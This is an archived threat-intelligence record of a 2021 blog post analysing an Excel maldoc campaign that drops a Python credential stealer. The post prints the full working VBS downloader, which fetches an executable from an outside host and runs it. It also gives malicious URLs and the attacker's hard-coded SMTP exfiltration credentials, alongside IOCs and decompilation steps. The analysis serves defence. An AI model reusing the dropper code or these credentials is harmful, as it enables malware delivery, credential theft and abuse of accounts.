{
    "id": "9d27eb74-dace-4d26-ba1c-00b4d286e136",
    "created_at": "2023-01-12T15:11:00.958128Z",
    "updated_at": "2025-03-27T02:05:52.494216Z",
    "deleted_at": null,
    "sha1_hash": "3a1ce88ea3374776740043b9b74ef1f3374c8b5e",
    "title": "2021-05-19 - Python stealer distribution via excel maldoc",
    "authors": "",
    "file_creation_date": "2022-05-28T01:31:27Z",
    "file_modification_date": "2022-05-28T01:31:27Z",
    "file_size": 363411,
    "plain_text": "# Python stealer distribution via excel maldoc\n\n**[malware.love/malware_analysis/reverse_engineering/2021/05/19/unknown-python-stealer.html](https://malware.love/malware_analysis/reverse_engineering/2021/05/19/unknown-python-stealer.html)**\n\nMay 19, 2021\n\n19 May 2021 » [malware_analysis,](https://malware.love/category/malware_analysis) [reverse_engineering](https://malware.love/category/reverse_engineering)\nToday I became aware of an interesting sample that turned out to be a stealer written in\nPython. It all started with an email that had a malicious Excel document attached:\n\n4c9e0da6515b621f41d21f1fd75b30f41ee0765598f1ad4c2a2698f63808445c - PO8506471648.xls\n\nAs usual, the Excel document contains a macro which downloads and executes another\npayload. In this case, the second payload was a VBS file stored at\n```\n hxxp://188[.]127.254.61/6846546874968946.php\n\n```\n(One thing to note here is, that the attackers blocked IP addresses from countries outside\ntheir current target area for example the download worked from germany but did not work\nfrom several other european countries.)\n\nThe VBS looks pretty simple and only has one job to do, to download and store the final\npayload :\n```\n winex_aa = \"https://u.teknik.io/0k9L0.mp4\" : winex_bb = Right(Year(Now),2) &\n Right(\"00\" & Month(Now),2) & Right(\"00\" & Day(Now),2) & Right(\"00\" & Hour(Now),2) &\n Right(\"00\" & Minute(Now),2) & Right(\"00\" & Second(Now),2) : winex_cc =\n \"C:\\Windows\\Temp\\XM\" & winex_bb & \".exe\" : Set winex_dd =\n CreateObject(\"MSXML2.XMLHTTP\") : winex_dd.open \"GET\", winex_aa, false :\n winex_dd.send()\n If winex_dd.Status = 200 Then\n Set winex_ee = CreateObject(\"ADODB.Stream\") : winex_ee.Open : winex_ee.Type = 1 :\n winex_ee.Write winex_dd.ResponseBody : winex_ee.Position = 0 : winex_ee.SaveToFile\n winex_cc : winex_ee.Close : Set winex_ee = Nothing\n End if\n Set winex_dd = Nothing : Set winex_ff = CreateObject(\"WScript.Shell\") :\n winex_ff.Exec(winex_cc)\n\n```\nThe final payload is quite large (13-14MB) and after looking for strings it became clear that\nit is a malware written in Python with lots of different external modules.\n\n\n-----\n\n```\n... SNIP\nbVCRUNTIME140.dll\nb_bz2.pyd\nb_cffi_backend.cp37-win_amd64.pyd\nb_ctypes.pyd\nb_decimal.pyd\nb_elementtree.pyd\nb_hashlib.pyd\nb_lzma.pyd\nb_multiprocessing.pyd\nb_queue.pyd\nb_socket.pyd\nb_sqlite3.pyd\nb_ssl.pyd\nb_win32sysloader.pyd\nbcryptography\\hazmat\\bindings\\_constant_time.cp37-win_amd64.pyd\nbcryptography\\hazmat\\bindings\\_openssl.cp37-win_amd64.pyd\nblibcrypto-1_1.dll\nblibssl-1_1.dll\nbmfc140u.dll\nbpyexpat.pyd\nbpython37.dll\nbpythoncom37.dll\nbpywintypes37.dll\nbselect.pyd\nbsimplejson\\_speedups.cp37-win_amd64.pyd\nbsqlite3.dll\nbtinyaes.cp37-win_amd64.pyd\nbunicodedata.pyd\nbwin32api.pyd\nbwin32com\\shell\\shell.pyd\nbwin32crypt.pyd\nbwin32trace.pyd\nbwin32ui.pyd\nbwin32wnet.pyd\nbxv.exe.manifest\nopyi-windows-manifest-filename xv.exe.manifest\nxInclude\\pyconfig.h\nxbase_library.zip\nxcertifi\\cacert.pem\nxcryptography-2.9.2-py3.7.egg-info\\PKG-INFO\nxcryptography-2.9.2-py3.7.egg-info\\SOURCES.txt\n%python37.dll\n... SNIP\n\n```\nThe most common way to make a windows executable from python code is to use\n[PyInstaller. In order to reverse the process, you can use PyInstaller Extractor.](https://www.%20pyinstaller.org/)\n\nWhen running Pyinstaller Extractor, you will see quite a lot of useful information in the log\nfor example the used Pyinstaller version, the used Python version and most important, the\npossible entry point.\n\n\n-----\n\n[As also described on the PyInstaller Extractor Github page, we now can try to decompile](https://github.%20com/extremecoders-re/pyinstxtractor)\nthe pyc files. Since `tx.pyc is the suggested entry point, we will start with that. Before`\ndecompiling the pyc file we need to fix the header because PyInstaller removed those\nbytes. In order to do so, we just add the following bytes at the beginning of the file `42 0d`\n```\n0d 0a 00 00 00 00 e4 b9 18 5d 00 00 00 00 .\n\n```\n[For decompiling python byte code, there are different tools available like Uncompyle6 or](https://github.%20com/rocky/python-uncompyle6/)\n[decompyle3. However, none of them in the latest version worked for me for whatever](https://github.com/rocky/python-decompile3)\nreason. Maybe it’s because I used the latest version, because Uncompyle6 version `2.7`\n[seems to work (thanks @bbaskin for the hint). I ended up using unpyc3 to decompile the](https://twitter.com/bbaskin)\n[pyc file which gave me beautiful round about 12.000 lines of python code.](https://gist.github.com/lazydaemon/0c783dd7fd057b2acc2298e0e6b732c3)\n\nI just analyzed a small portion of the sample because when scrolling through the code, it\nwas quite obvious that this must be stealer. There are tons of functions searching for\n[credentials for different tools/services, even KeeThief is included.](https://github.com/GhostPack/KeeThief)\n\nMy interest was in how the data is exfiltrated. After searching around a little bit, I could spot\na list, containing two dictionaries with smtp credentials (I renamed the variable for better\nreadability).\n```\nemails_for_exfil = [\n      {'email': 'ggveddy@yahoo.com', 'pass': 'lyhdqnatklklhvzf', \n       'server': 'smtp.mail.yahoo.com', 'port': 587,'security': 'TLS'},\n      {'email': 'ggceddy@yahoo.com', 'pass': 'fagvjohnktkopgol', \n      'server': 'smtp.mail.yahoo.com', 'port': 587, 'security': 'TLS'}]\n\n```\n[Following this list I could spot the function sending emails which takes the harvested](https://gist.github.com/lazydaemon/0c783dd7fd057b2acc2298e0e6b732c3#file-python_stealer-py-L11542)\n[credentials as input. Similar to AgentTesla, this stealer is exfiltrating stolen data via sending](https://isc.sans.%20edu/forums/diary/Agent+Tesla+Trojan+Abusing+Corporate+Email+Accounts/25336/)\nemails to specific hard-coded accounts.\n\nThere is currently no official name for the malware and it does not appear to be widespread.\n[James flagged it as Eightaliuim because of some strings inside the sample.](https://twitter.com/James_inthe_box)\n\n\n-----\n\nIf anyone has more samples or more details about this campaign, please let me know.\n\n_IOCs:_\n```\nExcel dropper:\n4c9e0da6515b621f41d21f1fd75b30f41ee0765598f1ad4c2a2698f63808445c\nDownload link for the VBS called from the dropper:\nhttp://188.127.254.61/6846546874968946.php\nVBS payload to download final payload:\nad109cb6bedbe3a492aca14b5ce603465b52aa88a3477692591556ef8702227e\nCalled from the VBS payload to download the final payload:\nhttps://u.teknik.io/0k9L0.mp4\nEmail receiving stolen credentials:\nggveddy@yahoo.com\nggceddy@yahoo.com\n\n```\n**Related Posts**\n\n[Having fun with a Ursnif VBS dropper (Categories:](https://malware.love/malware_analysis/reverse_engineering/2020/11/27/analyzing-a-vbs-dropper.html) [malware_analysis,](https://malware.love/category/malware_analysis.html)\n[reverse_engineering)](https://malware.love/category/reverse_engineering.html)\n[Trickbot tricks again [UPDATE] (Categories: malware_analysis,](https://malware.love/malware_analysis/reverse_engineering/2020/11/22/trickbot-fake-ips-part2.html) [reverse_engineering)](https://malware.love/category/reverse_engineering.html)\n[Trickbot tricks again (Categories:](https://malware.love/malware_analysis/reverse_engineering/2020/11/17/trickbots-latest-trick.html) [malware_analysis,](https://malware.love/category/malware_analysis.html) [reverse_engineering)](https://malware.love/category/reverse_engineering.html)\n\n[« Having fun with a Ursnif VBS dropper](https://malware.love/malware_analysis/reverse_engineering/2020/11/27/analyzing-a-vbs-dropper.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-19 - Python stealer distribution via excel maldoc.pdf"
    ],
    "report_names": [
        "2021-05-19 - Python stealer distribution via excel maldoc.pdf"
    ],
    "threat_actors": [
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536260,
    "ts_updated_at": 1743041152,
    "ts_creation_date": 1653701487,
    "ts_modification_date": 1653701487,
    "files": {
        "pdf": "https://archive.orkl.eu/3a1ce88ea3374776740043b9b74ef1f3374c8b5e.pdf",
        "text": "https://archive.orkl.eu/3a1ce88ea3374776740043b9b74ef1f3374c8b5e.txt",
        "img": "https://archive.orkl.eu/3a1ce88ea3374776740043b9b74ef1f3374c8b5e.jpg"
    }
}